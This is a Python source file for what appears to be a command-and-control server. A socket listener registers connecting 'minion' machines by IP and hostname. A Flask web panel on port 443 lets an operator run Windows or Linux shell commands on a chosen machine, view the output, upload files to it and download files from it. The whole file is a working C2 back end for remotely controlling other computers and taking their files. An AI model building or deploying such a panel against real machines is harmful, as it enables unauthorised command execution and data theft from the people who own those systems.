import socket
import threading
import time
from flask import *

ip_address ='127.0.0.1'
port_number = 5555
packet_size = 2048

CMD_INPUT = []
CMD_OUTPUT = []

Conns = {}
HELP_COMMANDS = ['?','HELP','help']
HELP = 'Send Windows\\ Linux commands. \n you can also send files to minion with command - download [path_on_host] [path_on_target] \n \
  get file from minion run command - upload [path_on_target] [path_on_host] -'



app = Flask(__name__)

@app.before_first_request
def init_server():
    srv = threading.Thread(target=server)
    srv.start()

def server():
    server_socket = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    server_socket.bind((ip_address,port_number))
    print("Starting Server....")
    server_socket.listen(5)
    INDEX =0
    while(True):
        connection,address = server_socket.accept()
        print(connection)
        if connection not in Conns:
            hostname = connection.recv(packet_size).decode()
            connection_status = {}
            connection_status['IP'] = address[0]
            connection_status['Port'] = address[1]
            connection_status['Hostname'] = hostname
            connection_status['Index'] = INDEX
            Conns[connection] = connection_status
            print(Conns)
            CMD_INPUT.append("")
            CMD_OUTPUT.append("")
            INDEX= INDEX +1
            print(Conns[connection])
            print("about to start thread")
            print(type(connection))
            t=threading.Thread(target=handle_connection,args=(connection,))
            t.start()
            print('thread Started')
        

def send_file(socket, filename):
    with open(filename,'rb') as inp:
        while True:
            print("sending data")
            bytes_read = inp.read(packet_size)
            if not bytes_read:
                print("breaking")
                time.sleep(1)
                socket.send(b'Send was done')
                break
            socket.send(bytes_read)
    inp.close()

def recv_file(socket,filename):
    print(filename)
    with open(filename,'wb') as out:
        while True:
            print("recieving data")
            bytes_read = socket.recv(packet_size)
            print(bytes_read)
            if bytes_read == b'Send was done':
                print("breaking")
                break
            out.write(bytes_read)
    out.close()


def handle_connection(connection):
    thread_index = Conns[connection]['Index']
    while CMD_INPUT[thread_index] != 'bye':
        while CMD_INPUT[thread_index]!='':
            usr_msg = CMD_INPUT[thread_index]
            print(f'about to send {usr_msg}')
            connection.send(usr_msg.encode())
            if CMD_INPUT[thread_index].split(" ")[0] =='download':
                send_file(connection,CMD_INPUT[thread_index].split(" ")[1])
                CMD_INPUT[thread_index]=''

            elif CMD_INPUT[thread_index].split(" ")[0] =='upload':
                print(CMD_INPUT[thread_index].split(" "))
                recv_file(connection,CMD_INPUT[thread_index].split(" ")[-1])
                CMD_INPUT[thread_index]=''

            elif CMD_INPUT[thread_index] !='bye':            
                usr_msg=connection.recv(packet_size).decode()
                CMD_OUTPUT[thread_index]=usr_msg
                print("Leaving second while!!!!")
                CMD_INPUT[thread_index]=''
            break
    del Conns[connection]




def find_connection(connection):
    for conn,val in Conns:
        print(conn)
        if conn == connection:
            return val['Index']

@app.route("/home")
def index():
    return render_template("index.html")

@app.route("/agents")
def agents():
    return render_template('agents.html',computers=Conns)


@app.route("/<agentname>/executecmd",methods=['GET','POST'])
def execute(agentname,cmdoutput='',cmd_input=""):
    if request.method == 'POST':
        cmd = request.form['command']

        for _,val in Conns.items():
            print(val)
            print(agentname)
            if agentname == val['Hostname']:
                req_index = val['Index']
                print(req_index)
                break
        if cmd in HELP_COMMANDS:
            cmdoutput=HELP
            return render_template("executecmd.html",cmdoutput=cmdoutput.strip(),name=agentname)

        CMD_INPUT[req_index] = cmd.strip()
        time.sleep(2)
        if cmd == 'bye':
            return redirect("/agents")
        else:
            cmdoutput = CMD_OUTPUT[req_index]
            print(cmdoutput)
            return render_template('executecmd.html',cmdoutput=cmdoutput.strip(),name=agentname,cmd_input=cmd)

    if request.method == 'GET':
        return render_template("executecmd.html",name=agentname,cmdoutput=cmdoutput,cmd_input=cmd_input)

if __name__=='__main__':
    app.run(debug=True,threaded=True,ssl_context=('cert.pem', 'key.pem'),port=443)